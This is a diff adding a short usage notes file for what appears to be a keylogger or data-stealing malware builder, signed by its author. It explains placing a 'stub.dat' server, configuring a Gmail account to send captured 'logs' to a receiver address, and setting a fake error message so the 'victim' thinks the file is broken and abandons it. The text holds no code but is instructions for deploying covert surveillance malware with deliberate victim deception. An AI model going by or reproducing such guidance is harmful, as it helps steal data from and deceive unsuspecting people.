@@ -1,0 +1,27 @@
+ÿ­Notes:
+
+Server must be in client directory with the name of "stub.dat" (Not .exe)
+
+Sender only works with gmail.Also you have to enable IMAP and POP in 
+your 
+gmail account.For this go to your gmail account and 
+Settings>>Forwarding 
+and POP/IMAP and choose "Enable POP for all mail" and "Enable IMAP", 
+then 
+click "Save Changes".
+
+Enter your gmail password in password textbox for sending mail 
+through the mail you entered.
+
+Receiver's email is the email that will receive logs.It could be any mail 
+services such as Yahoo,MSN,AOL,Gmail or etc.
+
+Enter a text in fake message textbox to show a fake message to victim, so he thinks the file has problem and couldn't be run and leaves it! Leave the textbox empty to don't show the fake message.
+
+_________________________________________________________
+
+For any getting more help or having suggestions you can mail me.
+Thank you.
+
+Salar Zeynali
+Salixem@Gmail.Com
